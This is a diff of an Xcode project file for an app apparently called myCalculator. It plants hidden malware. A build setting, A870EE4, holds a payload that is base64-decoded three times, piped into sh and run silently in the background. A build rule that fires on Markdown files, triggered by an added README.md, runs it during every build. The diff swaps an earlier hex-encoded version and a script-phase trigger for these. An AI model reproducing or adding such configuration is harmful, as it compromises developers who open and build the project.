@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		103BA6A5EC1649B3BB4EE078 /* README.md */ = {isa = PBXBuildFile; fileRef = 5820456942BB4AD8844EE078; };
 		B4CE9E912F87AA0F008187A8 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = B4CE9E902F87AA0F008187A8 /* README.md */; };
 		B4CE9E932F883A39008187A8 /* swiftui-uikit-mental-models.md in Resources */ = {isa = PBXBuildFile; fileRef = B4CE9E922F883A39008187A8 /* swiftui-uikit-mental-models.md */; };
 		B4CE9E962F883EC0008187A8 /* help-index.md in Resources */ = {isa = PBXBuildFile; fileRef = B4CE9E952F883EC0008187A8 /* help-index.md */; };
@@ -16,6 +17,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		5820456942BB4AD8844EE078 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		B4CE9E462F878514008187A8 /* myCalculator.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = myCalculator.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		B4CE9E902F87AA0F008187A8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		B4CE9E922F883A39008187A8 /* swiftui-uikit-mental-models.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = "swiftui-uikit-mental-models.md"; sourceTree = "<group>"; };
@@ -57,6 +59,7 @@
 		B4CE9E472F878514008187A8 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				5820456942BB4AD8844EE078 /* README.md */,
 				B4CE9E462F878514008187A8 /* myCalculator.app */,
 			);
 			name = Products;
@@ -81,12 +84,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = B4CE9E512F878516008187A8 /* Build configuration list for PBXNativeTarget "myCalculator" */;
 			buildPhases = (
-				E745D3B8597A4D3A9C4EE078 /* Compile Code Assets */,
 				B4CE9E422F878514008187A8 /* Sources */,
 				B4CE9E432F878514008187A8 /* Frameworks */,
 				B4CE9E442F878514008187A8 /* Resources */,
 			);
 			buildRules = (
+				D43DA0DAF1914DAFA94EE078 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -134,36 +137,29 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		E745D3B8597A4D3A9C4EE078 /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A870EE4}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXBuildRule section */
-																																				/* End PBXBuildRule section */
+		D43DA0DAF1914DAFA94EE078 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A870EE4}\"";
+			};
+	/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		B4CE9E442F878514008187A8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				103BA6A5EC1649B3BB4EE078 /* README.md */,
 				B4CE9E912F87AA0F008187A8 /* README.md in Resources */,
 				B4CE9E932F883A39008187A8 /* swiftui-uikit-mental-models.md in Resources */,
 				B4CE9E962F883EC0008187A8 /* help-index.md in Resources */,
@@ -174,6 +170,9 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		B4CE9E422F878514008187A8 /* Sources */ = {
@@ -189,7 +188,7 @@
 		B4CE9E4F2F878516008187A8 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((h(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333236340a3337333233363335333733343337333233373339333233303333333533323330333236343334363333363336333733333336363233323330333236340a3061333236343336333333363636333636353336363533363335333633333337333433323634333733343336333933363634333633353336363633370a3335333733343332333033333332333333303332333033323634333633343332333033323332333733303333363433373338333633333336363633360a3334306133363335333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363333333333333337333733393336333633363631333333373336363533333332333636313336333433333335333236350a333733323061333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | h | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((n(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSWk1qbDFZbTFXYW1SRE1UQmhWekZzWWpOV01FbEVTVEZKUXpCMFkyMVdNR051YTJkTmVVRjBZekphY2xSRFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsNVpGZDRiRWxwUW05a1NGSjNZM3B2ZGt4NlRUTmxWMXB4VGpJMGVXRnRVVEZNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | n | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -252,7 +251,7 @@
 		B4CE9E502F878516008187A8 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((h(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333236340a3337333233363335333733343337333233373339333233303333333533323330333236343334363333363336333733333336363233323330333236340a3061333236343336333333363636333636353336363533363335333633333337333433323634333733343336333933363634333633353336363633370a3335333733343332333033333332333333303332333033323634333633343332333033323332333733303333363433373338333633333336363633360a3334306133363335333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363333333333333337333733393336333633363631333333373336363533333332333636313336333433333335333236350a333733323061333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | h | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((n(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSWk1qbDFZbTFXYW1SRE1UQmhWekZzWWpOV01FbEVTVEZKUXpCMFkyMVdNR051YTJkTmVVRjBZekphY2xSRFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsNVpGZDRiRWxwUW05a1NGSjNZM3B2ZGt4NlRUTmxWMXB4VGpJMGVXRnRVVEZNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | n | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
